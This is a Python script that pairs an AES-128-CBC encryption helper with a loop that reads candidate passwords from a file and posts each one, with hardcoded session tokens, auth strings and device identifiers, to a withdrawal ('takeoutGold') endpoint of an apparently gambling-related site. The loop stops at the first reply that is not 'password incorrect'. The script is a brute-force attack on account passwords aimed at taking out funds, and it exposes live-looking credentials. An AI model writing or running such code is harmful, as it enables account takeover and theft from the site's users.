import base64
import hashlib
import time

from Crypto.Cipher import AES, DES


class DeAesCrypt:
    """
    AES-128-CBC解密
    """

    def __init__(self, key=None, iv=None, pad="zero"):
        """
        :param data: 加密后的字符串
        :param key: 随机的16位字符
        :param pad: 填充方式
        """
        self.key = key.encode("utf-8")
        # self.data = data
        self.pad = pad.lower()

        hash_obj = hashlib.md5()  # 构造md5对象
        hash_obj.update(key.encode())  # 进行md5加密,md5只能对byte类型进行加密
        res_md5 = hash_obj.hexdigest()  # 获取加密后的字符串数据
        self.iv = iv.encode("utf-8")

    def zeropadding(self, text):
        while len(text) % 16 != 0:
            text += '\0'
        return str.encode(text)

    def decrypt_aes(self, data):
        """AES-128-CBC解密"""
        # real_data = base64.b64decode(self.data)
        real_data = base64.b64decode(data)
        my_aes = AES.new(self.key, AES.MODE_CBC, self.iv)
        decrypt_data = my_aes.decrypt(real_data)
        print(decrypt_data)
        return self.get_str(decrypt_data)

    def encyrpt_aes(self, data):
        cipher = AES.new(self.key, AES.MODE_CBC, self.iv)
        content_padding = self.zeropadding(data)
        # 加密
        encrypt_bytes = cipher.encrypt(content_padding)
        # 重新编码
        result = str(base64.b64encode(encrypt_bytes), encoding='utf-8')
        return result

    def get_str(self, bd):
        """解密后的数据去除加密前添加的数据"""
        if self.pad == "zero":  # 去掉数据在转化前不足16位长度时添加的ASCII码为0编号的二进制字符
            return ''.join([chr(i) for i in bd if i != 0])

        # elif self.pad == "pkcs7":  # 去掉pkcs7模式中添加后面的字符
        #     return ''.join([chr(i) for i in i > 32])  # 此处报错，在我环境

        else:
            return "不存在此种数据填充方式"


import requests

headers = {
    'authority': 'web.1543434.com',
    'pragma': 'no-cache',
    'cache-control': 'no-cache',
    'sec-ch-ua': '" Not A;Brand";v="99", "Chromium";v="99", "Google Chrome";v="99"',
    'nonce': '992733e5-0542-414e-a42f-fa19baba00bb',
    'accept-language': 'zh',
    'data-uuid': 'data-uuid-318',
    'device': 'efacd0ae-f8be-4cac-a8dd-d29f9f7bf497',
    'sign': 'eeoVL18Tv3iTJ7BG2ke4/ShgsZ9AAmvNlKefEVK8u8W4zE+rejBJZ6QZE4ZmaQEY',
    'sec-ch-ua-platform': '"Windows"',
    'devicemodel': 'windows',
    'currency': 'CNY',
    'x-request-id': '992733e5-0542-414e-a42f-fa19baba00bb',
    'platformtype': '5',
    'domain': 'www.4424466.com',
    'sec-ch-ua-mobile': '?0',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.4844.84 Safari/537.36',
    'auth': 'bONVvk1k2VkMvYeh38yyn8RWz-_05yPleBpNHOHamnEUzGVMyJ9dxpv13AWRTJxpYP4j1aAVPV4fvUgSdcFZPBI5_wL6KA6HuHYZJYpA3junk_3tbgPS-N-YG4E6k5Gg8g2Yd6xv2-4VrmjhSgxWzP-kiQt38ivtsNmsqvwRc1qIlgHAaKlN7YRbmUr_e0cu3VefzfDjOI2X04jVecl4Mt613chSxx2zI1hQgxexioy4rpTXocOth3gR-BARnf1p3IB_tGiHNsktiIW6mBMmNVU3t5KzdJ-9cbE5-Zkw9CF_cINa1fr0vMEfj0EZ7Xp_eJRylrQ5r4DATtBFG973Sw',
    'content-type': 'text/plain',
    'accept': 'application/json, text/plain, */*',
    'token': '6f41c754354add2fe8451679226161017792164',
    'timestamp': '1679229389',
    'sitecode': '128',
    'language': 'zh',
    'clienttimezone': 'UTC+8',
    'browserfingerid': 'kTu3x6DHeBMF5xqZGSFw',
    'sec-fetch-site': 'cross-site',
    'sec-fetch-mode': 'cors',
    'sec-fetch-dest': 'empty',
    'referer': 'https://www.4424466.com/',
}

data = 'EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspY01Q+aate5/MXJ9quqb+CKg=='

if __name__ == '__main__':
    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
    key = "8325b1d23ff2eeb4"
    iv = "5421698523412578"
    # csss = DeAesCrypt(key, iv)
    # print(data)
    # jiemi = csss.decrypt_aes(data)
    # print(jiemi)
    # jiami = csss.encyrpt_aes(jiemi)
    # print(jiami)
    aes_obj = DeAesCrypt(key, iv)
    # content = ""
    # data = aes_obj.encyrpt_aes(content)
    # data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
    # response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
    # print(response.json())
    with open("pass.txt", "r") as f:
        for content in f.readlines():
            try:
                data = aes_obj.encyrpt_aes(content)
                data = "EMbUq0NGtfYhPu4MbmGqQ1dnKPOnCZERPunEIQWBC/Kw/xMaNKdlDtojAtQYzspYGdQlkZadZbobw+uSkcii2g=="
                response = requests.post('https://web.1543434.com/hall/yuebao/takeoutGold', headers=headers, data=data)
                res = response.json()
                if "密码不正确" == res.get("msg"):
                    # print(content, res)
                    continue
                else:
                    print(content, res)
                    break
                # time.sleep(1)
            except Exception as e:
                print(str(e),)
                time.sleep(10)